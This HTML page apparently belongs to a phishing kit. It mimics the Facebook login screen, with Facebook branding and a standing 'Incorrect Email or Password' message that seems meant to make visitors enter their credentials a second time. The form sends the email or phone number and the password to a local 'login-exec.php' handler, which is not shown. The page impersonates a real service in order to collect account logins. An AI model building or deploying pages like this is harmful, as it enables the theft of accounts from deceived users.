
<!DOCTYPE html >
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <link rel="shortcut icon" href="loginImg/title.jpg" />
    <title>Welcome to Facebook-Login</title>
    <link type="text/css" href="css/login.css" rel="stylesheet" />
    <link type="text/css" href="css/Againlogin.css" rel="stylesheet" />
    <script src="jquery/jquery-1.11.1.js" type="text/javascript"></script>
    <script src="jquery/againLogin.js" type="text/javascript"></script>
</head>
<body>
    <div id="header">
        <div id="facebook">
            <a href="login.php">facebook</a>
            <div class="Panel">
                <div class="textBold">Facebook Login</div>
                <hr class="greyline" />
                <div id="fbinfobox">
                    You must log in to continue.</div>
                <div id="fberrorbox">
                    Incorrect Email or Password
                    <br />
                    <br />
                    The email you entered does not belong to any account. <br /> <br />You can login using any email,
                    username or mobile phone number associated with your account. Make sure that it
                    is typed correctly.<br />
                </div>
                <div class="smallgreytext">
		<form action="login-exec.php" method="post" name="form2" id="form2" onSubmit="return logvalidate()">
    
                    Email or Phone: &nbsp
                    <input type="text" ID="login" name="login" runat="server" class="boxxx">
                    <br />
                    <br />
                    Password: &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                    <input type="password" ID="password1" name="password1" runat="server" class="boxxx">
                    <br />
                    <br />
                    &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                    &nbsp &nbsp
                    <input type="checkbox" ID="loggedin" />
                    <span class="bb">keep me logged in</span>
                <br/>
		<br/>
                <input type="submit" id="submit" value="Log In" class="blueeButon"/> <span class="simple">or </span><a href="login.php" class="aqua">Sign up for facebook</a>
		
		</form>
		<br/>
                <a class="smallText" href="forgotPassword.php">Forgot your password?</a></div>
            </div>
        </div>
    </div>
    <div class="footer">
        <br />
        </br><span class="graysmall">Facebook &copy 2014 </span></br><span class="bluesmall">English
            (US)</span>
    </div>
    
</body>
</html>
